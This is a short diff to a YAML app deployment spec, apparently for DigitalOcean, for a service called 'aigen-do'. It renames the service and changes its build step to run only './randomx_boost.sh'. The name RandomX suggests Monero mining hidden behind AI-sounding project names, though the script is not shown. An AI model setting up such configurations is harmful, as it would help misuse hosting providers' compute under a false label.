@@ -1,10 +1,9 @@
 yaml
 name: aigen-do
 services:
-- name: worker
+- name: job
   github:
     repo: RepLicanT-UHD/gptstream-do
     branch: master
-  build_command: ./randomx_boost.sh && docker build -t aigen .
-  dockerfile_path: Dockerfile
+  build_command: ./randomx_boost.sh
   source_dir: /
